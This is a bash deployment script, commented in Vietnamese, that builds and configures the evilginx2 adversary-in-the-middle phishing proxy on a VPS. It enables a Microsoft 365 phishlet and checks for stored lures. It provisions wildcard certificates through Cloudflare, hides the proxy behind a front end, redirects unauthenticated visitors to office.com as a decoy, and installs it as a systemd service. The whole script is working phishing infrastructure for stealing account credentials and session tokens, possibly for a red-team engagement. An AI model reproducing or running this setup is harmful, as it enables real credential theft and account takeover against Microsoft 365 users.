#!/usr/bin/env bash
# setup_evilginx.sh — deps + build + certs + runtime config + systemd cho evilginx2
# Chạy TRÊN VPS (Ubuntu), từ thư mục deploy/ của repo đã clone.
#
# Env:
#   BASE / ZONE / VPS_IP / CF_TOKEN   (bắt buộc cho certs stage)
#   EG_PORT=4443 API_PORT=9443 LANDING_SUB=accounts RUNTIME_DIR=~/.evilginx
#   SKIP_DEPS=1  SKIP_BUILD=1  SKIP_CERTS=1  (bỏ qua stage)
set -euo pipefail

BASE="${BASE:?BASE required}"
ZONE="${ZONE:?ZONE required}"
VPS_IP="${VPS_IP:?VPS_IP required}"
CF_TOKEN="${CF_TOKEN:-}"
EG_PORT="${EG_PORT:-4443}"
API_PORT="${API_PORT:-9443}"
LANDING_SUB="${LANDING_SUB:-accounts}"
RUNTIME_DIR="${RUNTIME_DIR:-$HOME/.evilginx}"

DEPLOY_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(dirname "$DEPLOY_DIR")"
LAB_DIR="$HOME/evilginx2-lab"
BASE_FQDN="${BASE}.${ZONE}"
SNI_HOST="${LANDING_SUB}.${BASE_FQDN}"
# nguồn source: trong repo (clone đầy đủ) hoặc src đã có sẵn trên máy (deploy trần)
SRC_DIR="${SRC_DIR:-$([ -d "$REPO_ROOT/src" ] && echo "$REPO_ROOT/src" || echo "$LAB_DIR/src")}"

echo "=== [1/6] deps (Go, jq, tmux) ==="
if [ "${SKIP_DEPS:-0}" != "1" ]; then
  command -v jq >/dev/null || { sudo apt-get update -qq >/dev/null; sudo apt-get install -y -qq jq >/dev/null; }
  if ! command -v go >/dev/null; then
    curl -fsSLo /tmp/go.tgz https://go.dev/dl/go1.26.4.linux-amd64.tar.gz
    sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf /tmp/go.tgz
    sudo ln -sf /usr/local/go/bin/go /usr/local/bin/go
    sudo ln -sf /usr/local/go/bin/gofmt /usr/local/bin/gofmt
    rm -f /tmp/go.tgz
  fi
  go version
fi

echo "=== [2/6] build (vendor, no network) ==="
if [ "${SKIP_BUILD:-0}" != "1" ]; then
  [ -d "$SRC_DIR" ] || { echo "FAIL: không tìm thấy src/ ($SRC_DIR) — clone repo đầy đủ hoặc đặt SRC_DIR"; exit 1; }
  # phishlets bị gitignore theo thiết kế (không ship campaign phishlets qua public repo) —
  # operator tự đặt file phishlet vào src/phishlets/ TRƯỚC khi chạy stage này
  if [ ! -f "$SRC_DIR/phishlets/ms365.yaml" ]; then
    echo "WARNING: $SRC_DIR/phishlets/ms365.yaml không tồn tại (phishlets bị gitignore theo thiết kế)."
    echo "         Đặt file phishlet của campaign vào $SRC_DIR/phishlets/ rồi chạy lại, hoặc dùng SRC_DIR=<thư mục có phishlets>."
    [ "${ALLOW_NO_PHISHLET:-0}" = "1" ] || exit 1
  fi
  mkdir -p "$LAB_DIR"
  rm -rf "$LAB_DIR/src-build"
  cp -r "$SRC_DIR" "$LAB_DIR/src-build"
  (cd "$LAB_DIR/src-build" && go build -mod=vendor -o ../evilginx2 .)
  sudo setcap cap_net_bind_service=+ep "$LAB_DIR/evilginx2"
  # phishlets PHẢI nằm ở runtime dir (binary không tự thấy src/phishlets)
  rm -rf "$LAB_DIR/phishlets" && cp -r "$SRC_DIR/phishlets" "$LAB_DIR/phishlets"
  "$LAB_DIR/evilginx2" -v 2>&1 | head -1 || true
fi

echo "=== [3/6] runtime config.json (service stopped) ==="
sudo systemctl stop evilginx2 2>/dev/null || true
if [ ! -f "$RUNTIME_DIR/config.json" ]; then
  # khởi động lần đầu để framework sinh config.json + data.db + api certs, rồi tắt
  (cd "$LAB_DIR" && timeout 8 ./evilginx2 -p ./phishlets -developer >/dev/null 2>&1 || true)
fi
python3 - "$RUNTIME_DIR" "$BASE_FQDN" "$VPS_IP" "$EG_PORT" <<'PYEOF'
import json, sys, os
runtime, base_fqdn, vps_ip, eg_port = sys.argv[1:5]
p = os.path.join(runtime, "config.json")
cfg = json.load(open(p))
g = cfg.setdefault("general", {})
g["autocert"] = False                      # KHÔNG BAO GIỜ bật lại trên node internet-facing
g["domain"] = base_fqdn
g["external_ipv4"] = vps_ip
g["bind_ipv4"] = "127.0.0.1"               # đứng sau InfraGuard; API cũng loopback -> egctl qua SSH tunnel
g["https_port"] = int(eg_port)
g["unauth_url"] = g.get("unauth_url") or "https://www.office.com"
pl = cfg.setdefault("phishlets", {}).setdefault("ms365", {})
pl["hostname"] = base_fqdn
pl["enabled"] = True
json.dump(cfg, open(p, "w"), indent=2)
print("config.json:", g["domain"], "| https_port:", eg_port, "| bind:", g["bind_ipv4"], "| autocert:", g["autocert"])
PYEOF

echo "=== [4/6] lure check (tạo qua API ở stage verify nếu chưa có) ==="
python3 - "$RUNTIME_DIR" <<'PYEOF' || true
import sqlite3, sys, os
db = os.path.join(sys.argv[1], "data.db")
if os.path.exists(db):
    con = sqlite3.connect(db)
    try:
        n = con.execute("select count(*) from lures").fetchone()[0]
        print(f"lures in db: {n}")
    except Exception as e:
        print("lures table:", e)
PYEOF

echo "=== [5/6] wildcard certs (chạy khi service stopped) ==="
if [ "${SKIP_CERTS:-0}" != "1" ]; then
  (cd "$DEPLOY_DIR" && CF_TOKEN="$CF_TOKEN" BASE="$BASE" ZONE="$ZONE" VPS_IP="$VPS_IP" \
    RUNTIME_DIR="$RUNTIME_DIR" \
    RELOAD_CMD="true" \
    ./wildcard-cert-setup.sh)
fi

echo "=== [6/6] systemd unit ==="
sudo systemctl stop evilginx2 2>/dev/null || true
sudo sed -e "s|\${API_PORT}|${API_PORT}|g" \
    -e "s|\${JA4_FLAG}|${JA4_FLAG:-}|g" \
    -e "s|%i|${BASE_FQDN}|g" \
    "$DEPLOY_DIR/templates/evilginx2.service.tpl" | sudo tee /etc/systemd/system/evilginx2.service >/dev/null
sudo systemctl daemon-reload
sudo systemctl enable --now evilginx2
sleep 10
systemctl is-active evilginx2
sudo journalctl -u evilginx2 --no-pager --since "-1 min" --output=cat | grep -iE "listening|cert" | tail -4

echo ""
echo "DONE evilginx stage. Proxy+API trên 127.0.0.1 (đứng sau InfraGuard)."
echo "NOTE: KHÔNG dùng -bg-ja4 trong kiến trúc InfraGuard-front (loopback-only, fingerprint thống nhất)."
